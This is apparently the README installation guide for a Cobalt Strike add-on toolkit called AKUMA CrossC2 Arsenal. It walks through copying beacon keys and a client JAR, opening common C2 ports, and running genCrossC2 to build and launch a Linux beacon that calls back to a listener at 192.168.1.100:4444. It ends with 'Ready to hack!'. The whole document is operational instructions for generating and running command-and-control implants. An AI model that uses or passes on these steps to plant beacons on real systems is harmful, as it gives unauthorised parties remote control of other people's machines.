# 🛠️ AKUMA CrossC2 Arsenal - Installation Guide

## Prerequisites

### System Requirements
- **OS**: Linux (Ubuntu 18.04+, Kali Linux, etc.)
- **Java**: OpenJDK 11+ 
- **Memory**: 4GB RAM minimum
- **Disk**: 2GB free space
- **Network**: Outbound connections on custom ports

### Required Software
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y git openjdk-11-jdk build-essential

# Arch Linux
sudo pacman -S git jdk11-openjdk base-devel

# CentOS/RHEL
sudo yum install -y git java-11-openjdk-devel gcc gcc-c++
```

## Installation Steps

### 1. Clone the Arsenal
```bash
git clone https://github.com/sweetpotatohack/AKUMA-CrossC2-Arsenal.git
cd AKUMA-CrossC2-Arsenal
chmod +x tools/genCrossC2.Linux
```

### 2. Setup Cobalt Strike Integration
```bash
# Copy your Cobalt Strike beacon keys
cp /path/to/your/.cobaltstrike.beacon_keys ./

# Load scripts in Cobalt Strike:
# Cobalt Strike -> Script Manager -> Load -> scripts/CrossC2Kit_Loader.cna
```

### 3. Verify Installation
```bash
# Test genCrossC2
./tools/genCrossC2.Linux

# Should show usage information
```

## Configuration

### Beacon Keys Setup
```bash
# Make sure beacon keys are readable
chmod 644 .cobaltstrike.beacon_keys

# For genCrossC2 to work, copy client JAR
cp /path/to/cobaltstrike-client.jar ./.gen.jar
```

### Firewall Configuration
```bash
# Allow common C2 ports
sudo ufw allow 4444/tcp
sudo ufw allow 443/tcp
sudo ufw allow 80/tcp
```

## First Beacon Generation

```bash
# Generate your first beacon
./tools/genCrossC2.Linux \
  192.168.1.100 \
  4444 \
  ./.cobaltstrike.beacon_keys \
  null \
  Linux \
  x64 \
  ./first_beacon \
  raw

# Test the beacon
chmod +x ./first_beacon
./first_beacon &
```

## Troubleshooting

### Common Issues

#### 1. "Unable to access jarfile ./.gen.jar"
```bash
# Solution:
cp /path/to/cobaltstrike-client.jar ./.gen.jar
```

#### 2. "read key error"
```bash
# Check beacon keys permissions:
ls -la .cobaltstrike.beacon_keys
chmod 644 .cobaltstrike.beacon_keys
```

#### 3. Beacon not connecting
```bash
# Check listener status:
ss -tuln | grep [PORT]

# Check beacon process:
ps aux | grep beacon
```

Ready to hack! 🔥
